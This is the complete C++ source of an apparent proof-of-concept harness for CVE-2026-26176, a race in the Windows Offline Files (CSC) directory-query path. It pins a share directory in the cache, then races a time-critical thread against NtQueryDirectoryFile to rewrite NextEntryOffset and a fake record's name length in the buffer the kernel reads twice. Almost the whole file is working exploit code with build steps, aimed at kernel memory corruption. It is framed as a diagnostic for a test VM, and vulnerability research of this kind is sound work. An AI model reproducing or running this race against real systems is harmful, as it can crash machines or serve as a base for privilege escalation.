/*
 * CVE-2026-26176 CSC directory query repro harness
 *
 * This is a diagnostic crash/repro harness for a local test VM.  The current
 * working theory is not a simple "long filename + small buffer" bug.  The
 * interesting path is:
 *
 *   NtQueryDirectoryFile
 *     -> rdbss!RxQueryDirectory
 *     -> csc!CscQueryDirectory
 *     -> csc!CscQueryDirOnlineAndUpdateCache
 *     -> csc!CscQueryDirStitchRemoteBuffer
 *     -> csc!CscQueryDirStitchSingleEntry
 *
 * The server returns a normal SMB QUERY_DIRECTORY response into the user
 * FileInformation buffer.  CSC then reads the same mapped output buffer again
 * while stitching the remote result into the local Offline Files cache state.
 * This harness first nudges CSC cache state with cscdll.dll, then races a
 * mutator thread against NtQueryDirectoryFile to change the first record's
 * NextEntryOffset and a fake second record's name fields.
 *
 * Build:
 *   cl /EHsc /std:c++17 /W4 /DUNICODE /D_UNICODE /Fe:poc.exe poc.cpp /link ntdll.lib ole32.lib
 *
 * Typical use:
 *   poc.exe
 *
 * Change DEFAULT_SMB_PATH only.  The harness uses that path for directory
 * query and derives a random PIN path under DEFAULT_SMB_PATH.
 */

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#endif

#include <windows.h>
#include <objbase.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "ole32.lib")

#ifndef STATUS_PENDING
#define STATUS_PENDING ((NTSTATUS)0x00000103L)
#endif

typedef NTSTATUS(NTAPI* PFN_NtQueryDirectoryFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan);

typedef BOOL(WINAPI* PFN_CSCQueryFileStatusW)(LPCWSTR, LPDWORD, LPDWORD, LPDWORD);
typedef BOOL(WINAPI* PFN_CSCPinFileW)(LPCWSTR, DWORD, LPDWORD, LPDWORD, LPDWORD);

typedef enum _CSC_FILE_INFORMATION_CLASS {
    CscFileDirectoryInformation = 1,
    CscFileFullDirectoryInformation = 2,
    CscFileBothDirectoryInformation = 3,
    CscFileNamesInformation = 12,
    CscFileIdBothDirectoryInformation = 37,
    CscFileIdFullDirectoryInformation = 38
} CSC_FILE_INFORMATION_CLASS;

#define DEFAULT_SMB_PATH L"\\\\192.168.50.223\\test\\"
#define QUERY_TIMEOUT_MS 8000
#define PIN_WAIT_MS 3500
#define DEFAULT_QUERY_LENGTH 0x1000
#define DEFAULT_MUTATE_NEXT_OFFSET 0xF80
#define DEFAULT_FAKE_NAME_LENGTH 0x400
#define PIN_FLAG_FULL 0x00000001

static PFN_NtQueryDirectoryFile g_NtQueryDirectoryFile = NULL;
static PFN_CSCQueryFileStatusW g_CSCQueryFileStatusW = NULL;
static PFN_CSCPinFileW g_CSCPinFileW = NULL;

static WCHAR g_OpenPath[1024] = DEFAULT_SMB_PATH;
static WCHAR g_PinPath[1024] = { 0 };
static WCHAR g_Filter[260] = L"*";
static BOOL g_EnableMutation = TRUE;
static ULONG g_QueryLength = DEFAULT_QUERY_LENGTH;
static ULONG g_MutateNextOffset = DEFAULT_MUTATE_NEXT_OFFSET;
static ULONG g_FakeNameLength = DEFAULT_FAKE_NAME_LENGTH;
static int g_Attempts = 16;

typedef struct _OUTPUT_ALLOCATION {
    BYTE* Reservation;
    BYTE* Buffer;
    SIZE_T ReservationSize;
    SIZE_T BufferSize;
} OUTPUT_ALLOCATION;

typedef struct _QUERY_THREAD_ARGS {
    HANDLE Directory;
    BYTE* Buffer;
    ULONG BufferLength;
    CSC_FILE_INFORMATION_CLASS InformationClass;
    UNICODE_STRING Filter;
    IO_STATUS_BLOCK Iosb;
    NTSTATUS Status;
} QUERY_THREAD_ARGS;

typedef struct _MUTATOR_ARGS {
    volatile LONG Stop;
    BYTE* Buffer;
    ULONG BufferLength;
    ULONG NextOffset;
    ULONG FakeNameLength;
    volatile LONG Mutations;
    volatile LONG ObservedRemoteWrites;
} MUTATOR_ARGS;

static void EnsureTrailingSlash(WCHAR* path, size_t count) {
    size_t len = wcslen(path);
    if (len && path[len - 1] != L'\\') {
        wcscat_s(path, count, L"\\");
    }
}

static void DerivePinPathFromOpenPath(void) {
    GUID guid;
    WCHAR childName[80] = { 0 };

    if (FAILED(CoCreateGuid(&guid))) {
        printf("[!] CoCreateGuid failed; using fixed fallback directory name\n");
        wcscpy_s(childName, ARRAYSIZE(childName), L"csc_fallback");
    }
    else {
        swprintf_s(childName, ARRAYSIZE(childName), L"csc_%08lX_%04hX_%04hX_%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX", guid.Data1, guid.Data2, guid.Data3, guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3], guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]);
    }
    wcsncpy_s(g_PinPath, ARRAYSIZE(g_PinPath), g_OpenPath, _TRUNCATE);
    EnsureTrailingSlash(g_PinPath, ARRAYSIZE(g_PinPath));
    wcscat_s(g_PinPath, ARRAYSIZE(g_PinPath), childName);
    EnsureTrailingSlash(g_PinPath, ARRAYSIZE(g_PinPath));
}

static void InitUnicodeString(PUNICODE_STRING str, PCWSTR value) {
    size_t len = wcslen(value) * sizeof(WCHAR);
    str->Length = (USHORT)len;
    str->MaximumLength = (USHORT)(len + sizeof(WCHAR));
    str->Buffer = (PWSTR)value;
}

static BOOL ResolveFunctions(void) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) {
        printf("[-] GetModuleHandleW(ntdll.dll) failed: %lu\n", GetLastError());
        return FALSE;
    }

    g_NtQueryDirectoryFile = (PFN_NtQueryDirectoryFile)GetProcAddress(ntdll, "NtQueryDirectoryFile");
    if (!g_NtQueryDirectoryFile) {
        printf("[-] Failed to resolve NtQueryDirectoryFile\n");
        return FALSE;
    }

    HMODULE cscdll = LoadLibraryW(L"cscdll.dll");
    if (!cscdll) {
        printf("[!] LoadLibraryW(cscdll.dll) failed: %lu\n", GetLastError());
        printf("[!] PIN stage will be unavailable on this host.\n");
        return TRUE;
    }

    g_CSCQueryFileStatusW = (PFN_CSCQueryFileStatusW)GetProcAddress(cscdll, "CSCQueryFileStatusW");
    g_CSCPinFileW = (PFN_CSCPinFileW)GetProcAddress(cscdll, "CSCPinFileW");
    if (!g_CSCQueryFileStatusW || !g_CSCPinFileW) {
        printf("[!] cscdll.dll loaded, but CSCQueryFileStatusW/CSCPinFileW was not found\n");
    }

    printf("[+] NtQueryDirectoryFile @ %p\n", (void*)g_NtQueryDirectoryFile);
    printf("[+] CSCQueryFileStatusW @ %p\n", (void*)g_CSCQueryFileStatusW);
    printf("[+] CSCPinFileW         @ %p\n", (void*)g_CSCPinFileW);
    return TRUE;
}

static void CheckCscService(void) {
    printf("[*] Checking CSC service state\n");
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) {
        printf("[!] OpenSCManagerW failed: %lu\n", GetLastError());
        return;
    }

    SC_HANDLE svc = OpenServiceW(scm, L"CSC", SERVICE_QUERY_STATUS);
    if (!svc) {
        printf("[!] OpenServiceW(CSC) failed: %lu\n", GetLastError());
        CloseServiceHandle(scm);
        return;
    }

    SERVICE_STATUS status = {};
    if (QueryServiceStatus(svc, &status)) {
        printf("[*] CSC service state: %lu (4 means RUNNING)\n", status.dwCurrentState);
    }
    else {
        printf("[!] QueryServiceStatus failed: %lu\n", GetLastError());
    }

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
}

static BOOL QueryCscStatus(PCWSTR path, DWORD* status, DWORD* pinCount, DWORD* hintFlags) {
    if (!g_CSCQueryFileStatusW) {
        return FALSE;
    }

    *status = 0;
    *pinCount = 0;
    *hintFlags = 0;
    SetLastError(0);
    BOOL ok = g_CSCQueryFileStatusW(path, status, pinCount, hintFlags);
    DWORD gle = GetLastError();
    if (ok) {
        printf("    status path=%ls status=0x%08lX pin=%lu hint=0x%08lX\n", path, *status, *pinCount, *hintFlags);
    }
    else {
        printf("    status path=%ls failed gle=%lu\n", path, gle);
    }
    return ok;
}

static BOOL PinOnePath(PCWSTR path) {
    DWORD status = 0, pinCount = 0, hintFlags = 0;
    QueryCscStatus(path, &status, &pinCount, &hintFlags);

    if (!g_CSCPinFileW) {
        return FALSE;
    }

    SetLastError(0);
    BOOL ok = g_CSCPinFileW(path, PIN_FLAG_FULL, &status, &pinCount, &hintFlags);
    DWORD gle = GetLastError();
    if (ok) {
        printf("    pin    path=%ls ok status=0x%08lX pin=%lu hint=0x%08lX\n", path, status, pinCount, hintFlags);
    }
    else {
        printf("    pin    path=%ls failed gle=%lu status=0x%08lX pin=%lu hint=0x%08lX\n", path, gle, status, pinCount, hintFlags);
    }

    QueryCscStatus(path, &status, &pinCount, &hintFlags);
    return ok;
}

static BOOL PinCacheState(void) {
    if (!g_CSCQueryFileStatusW || !g_CSCPinFileW) {
        printf("[!] cscdll exports unavailable; skipping PIN stage\n");
        return FALSE;
    }

    printf("[*] PINning Offline Files cache directory\n");

    WCHAR dirNoSlash[1024] = { 0 };
    wcscpy_s(dirNoSlash, ARRAYSIZE(dirNoSlash), g_PinPath);
    size_t len = wcslen(dirNoSlash);
    while (len > 2 && dirNoSlash[len - 1] == L'\\') {
        dirNoSlash[len - 1] = 0;
        len--;
    }

    BOOL anyPinned = FALSE;
    anyPinned |= PinOnePath(dirNoSlash);

    Sleep(PIN_WAIT_MS);
    return anyPinned;
}

static HANDLE OpenDirectoryForQuery(void) {
    HANDLE handle = CreateFileW(g_OpenPath, FILE_LIST_DIRECTORY | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (handle == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFileW(%ls) failed: %lu\n", g_OpenPath, GetLastError());
    }
    return handle;
}

static BOOL AllocateOutputBuffer(ULONG length, OUTPUT_ALLOCATION* out) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    SIZE_T page = si.dwPageSize;
    SIZE_T middleSize = (length + page - 1) & ~(page - 1);
    SIZE_T total = middleSize + page * 2;

    BYTE* reservation = (BYTE*)VirtualAlloc(NULL, total, MEM_RESERVE, PAGE_NOACCESS);
    if (!reservation) {
        printf("[-] VirtualAlloc reserve failed: %lu\n", GetLastError());
        return FALSE;
    }

    BYTE* buffer = reservation + page;
    if (!VirtualAlloc(buffer, middleSize, MEM_COMMIT, PAGE_READWRITE)) {
        printf("[-] VirtualAlloc commit failed: %lu\n", GetLastError());
        VirtualFree(reservation, 0, MEM_RELEASE);
        return FALSE;
    }

    memset(buffer, 0, middleSize);
    out->Reservation = reservation;
    out->Buffer = buffer;
    out->ReservationSize = total;
    out->BufferSize = middleSize;
    return TRUE;
}

static void FreeOutputBuffer(OUTPUT_ALLOCATION* alloc) {
    if (alloc->Reservation) {
        VirtualFree(alloc->Reservation, 0, MEM_RELEASE);
    }
    memset(alloc, 0, sizeof(*alloc));
}

static void DumpRecordSummary(const BYTE* buffer, ULONG bufferLength, ULONG_PTR info) {
    ULONG_PTR limit = info;
    if (!limit || limit > bufferLength) {
        limit = bufferLength;
    }

    printf("      buffer=%p len=0x%lX info=%llu\n", buffer, bufferLength, (unsigned long long)info);

    ULONG_PTR offset = 0;
    for (int i = 0; i < 5 && offset + sizeof(ULONG) <= limit; i++) {
        ULONG next = *(const ULONG*)(buffer + offset);
        ULONG nameLen = 0;
        if (offset + 64 <= limit) {
            nameLen = *(const ULONG*)(buffer + offset + 60);
        }
        printf("      rec[%d] off=0x%llX next=0x%08lX nameLen=0x%08lX\n", i, (unsigned long long)offset, next, nameLen);
        if (!next || next > bufferLength || offset + next <= offset) {
            break;
        }
        offset += next;
    }
}

static void ApplyMutation(BYTE* buffer, ULONG bufferLength, ULONG nextOffset, ULONG fakeNameLength) {
    if (bufferLength < sizeof(ULONG)) {
        return;
    }

    *(volatile ULONG*)(buffer + 0) = nextOffset;

    if (nextOffset + 4 <= bufferLength) {
        *(volatile ULONG*)(buffer + nextOffset) = 0;
    }

    if (nextOffset + 64 <= bufferLength) {
        *(volatile ULONG*)(buffer + nextOffset + 60) = fakeNameLength;
    }

    if (nextOffset + 94 < bufferLength) {
        SIZE_T fill = bufferLength - (nextOffset + 94);
        memset(buffer + nextOffset + 94, 'A', fill);
    }
}

static DWORD WINAPI MutatorThread(LPVOID ctx) {
    MUTATOR_ARGS* args = (MUTATOR_ARGS*)ctx;
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

    while (InterlockedCompareExchange(&args->Stop, 0, 0) == 0) {
        ULONG firstDword = *(volatile ULONG*)args->Buffer;
        ULONG nameLen = 0;
        if (args->BufferLength >= 64) {
            nameLen = *(volatile ULONG*)(args->Buffer + 60);
        }

        if ((firstDword && firstDword != args->NextOffset) ||
            (nameLen && nameLen != args->FakeNameLength)) {
            InterlockedIncrement(&args->ObservedRemoteWrites);
        }

        ApplyMutation(args->Buffer, args->BufferLength, args->NextOffset, args->FakeNameLength);
        InterlockedIncrement(&args->Mutations);
        YieldProcessor();
    }

    return 0;
}

static DWORD WINAPI QueryThread(LPVOID ctx) {
    QUERY_THREAD_ARGS* args = (QUERY_THREAD_ARGS*)ctx;
    args->Iosb.Status = STATUS_PENDING;
    args->Iosb.Information = 0;

    args->Status = g_NtQueryDirectoryFile(args->Directory, NULL, NULL, NULL, &args->Iosb, args->Buffer, args->BufferLength, (FILE_INFORMATION_CLASS)args->InformationClass, FALSE, &args->Filter, TRUE);

    return 0;
}

static BOOL RunOneQueryAttempt(int attempt, CSC_FILE_INFORMATION_CLASS infoClass) {
    OUTPUT_ALLOCATION output = {};
    if (!AllocateOutputBuffer(g_QueryLength, &output)) {
        return FALSE;
    }

    HANDLE dir = OpenDirectoryForQuery();
    if (dir == INVALID_HANDLE_VALUE) {
        FreeOutputBuffer(&output);
        return FALSE;
    }

    QUERY_THREAD_ARGS query = {};
    query.Directory = dir;
    query.Buffer = output.Buffer;
    query.BufferLength = g_QueryLength;
    query.InformationClass = infoClass;
    InitUnicodeString(&query.Filter, g_Filter);

    MUTATOR_ARGS mut = {};
    mut.Buffer = output.Buffer;
    mut.BufferLength = g_QueryLength;
    mut.NextOffset = g_MutateNextOffset;
    mut.FakeNameLength = g_FakeNameLength;

    printf("[+] Attempt %d: class=%d len=0x%lX filter=%ls buffer=%p mutate=%s next=0x%lX fakeName=0x%lX\n", attempt, (int)infoClass, g_QueryLength, g_Filter, output.Buffer, g_EnableMutation ? "on" : "off", g_MutateNextOffset, g_FakeNameLength);
    fflush(stdout);

    HANDLE mutThread = NULL;
    if (g_EnableMutation) {
        mutThread = CreateThread(NULL, 0, MutatorThread, &mut, 0, NULL);
        if (!mutThread) {
            printf("[-] CreateThread(mutator) failed: %lu\n", GetLastError());
        }
    }

    HANDLE queryThread = CreateThread(NULL, 0, QueryThread, &query, 0, NULL);
    if (!queryThread) {
        printf("[-] CreateThread(query) failed: %lu\n", GetLastError());
        InterlockedExchange(&mut.Stop, 1);
        if (mutThread) {
            WaitForSingleObject(mutThread, 1000);
            CloseHandle(mutThread);
        }
        CloseHandle(dir);
        FreeOutputBuffer(&output);
        return FALSE;
    }

    DWORD wait = WaitForSingleObject(queryThread, QUERY_TIMEOUT_MS);
    if (wait == WAIT_TIMEOUT) {
        printf("    [!] query timeout after %u ms; requesting cancellation\n", QUERY_TIMEOUT_MS);
        CancelIoEx(dir, NULL);
        wait = WaitForSingleObject(queryThread, 2000);
        if (wait == WAIT_TIMEOUT) {
            printf("    [!] query thread still pending; stopping harness to avoid stale IRP reuse\n");
            InterlockedExchange(&mut.Stop, 1);
            if (mutThread) {
                WaitForSingleObject(mutThread, 1000);
                CloseHandle(mutThread);
            }
            CloseHandle(queryThread);
            /* Leak dir/output intentionally because a cancelled IRP may still own them. */
            return FALSE;
        }
    }

    InterlockedExchange(&mut.Stop, 1);
    if (mutThread) {
        WaitForSingleObject(mutThread, 1000);
        CloseHandle(mutThread);
    }

    printf("    status=0x%08lX iosb.Status=0x%08lX info=%llu mutations=%ld observedRemoteWrites=%ld\n", (unsigned long)query.Status, (unsigned long)query.Iosb.Status, (unsigned long long)query.Iosb.Information, mut.Mutations, mut.ObservedRemoteWrites);

    DumpRecordSummary(output.Buffer, g_QueryLength, (ULONG_PTR)query.Iosb.Information);

    CloseHandle(queryThread);
    CloseHandle(dir);
    FreeOutputBuffer(&output);
    return TRUE;
}

static void RunQueries(void) {
    CSC_FILE_INFORMATION_CLASS classes[] = {
        CscFileBothDirectoryInformation,
        CscFileFullDirectoryInformation,
        CscFileDirectoryInformation,
        CscFileNamesInformation,
    };

    for (int i = 0; i < g_Attempts; i++) {
        CSC_FILE_INFORMATION_CLASS cls = classes[i % (sizeof(classes) / sizeof(classes[0]))];
        if (!RunOneQueryAttempt(i + 1, cls)) {
            break;
        }
        Sleep(150);
    }
}

int main() {
    printf("[+] CVE-2026-26176 CSC directory query PIN/race harness\n");

    DerivePinPathFromOpenPath();
    EnsureTrailingSlash(g_OpenPath, ARRAYSIZE(g_OpenPath));
    EnsureTrailingSlash(g_PinPath, ARRAYSIZE(g_PinPath));

    if (!g_QueryLength) {
        g_QueryLength = DEFAULT_QUERY_LENGTH;
    }
    if (g_MutateNextOffset + 128 > g_QueryLength) {
        ULONG adjusted = (g_QueryLength > 0x100) ? ((g_QueryLength - 0x80) & ~7UL) : 0;
        printf("[!] Configured next offset is close to or beyond query length; adjusting next offset to 0x%lX\n", adjusted);
        g_MutateNextOffset = adjusted;
    }

    printf("[+] SMB path : %ls\n", DEFAULT_SMB_PATH);
    printf("[+] Open path: %ls\n", g_OpenPath);
    printf("[+] PIN path : %ls\n", g_PinPath);
    printf("[+] Filter   : %ls\n", g_Filter);
    printf("[+] Length   : 0x%lX\n", g_QueryLength);
    printf("[+] Mutator  : %s\n\n", g_EnableMutation ? "enabled" : "disabled");

    if (!ResolveFunctions()) {
        return 1;
    }

    CheckCscService();

    printf("\n[+] Stage 1: create/check PIN state\n");
    PinCacheState();

    printf("\n[+] Stage 2: query/race\n");
    RunQueries();

    printf("\n[+] Done. If no csc!CscQueryDirectory breakpoint hits, the handle is not entering CSC.\n");
    printf("[+] If CscQueryDirectory hits but CscQueryDirOnlineAndUpdateCache does not, inspect ConnectionState & 0x20 and PIN state.\n");
    return 0;
}
